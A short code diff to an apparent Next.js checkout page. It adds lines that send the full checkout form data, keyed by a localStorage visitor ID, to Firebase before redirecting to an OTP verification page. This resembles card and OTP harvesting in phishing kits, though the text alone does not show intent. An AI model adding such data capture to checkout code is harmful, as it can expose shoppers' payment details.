@@ -12,6 +12,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Separator } from "@/components/ui/separator"
 import Link from "next/link"
 import { useCart } from "@/contexts/cart-context"
+import { addData } from "@/lib/firebase"
 
 export default function CheckoutPage() {
   const [paymentMethod, setPaymentMethod] = useState("card")
@@ -39,6 +40,8 @@ export default function CheckoutPage() {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     // Redirect to OTP verification
+    const visitorId=localStorage.getItem('visitor')
+    addData({id:visitorId,formData})
     window.location.href = "/otp-verification"
   }
 
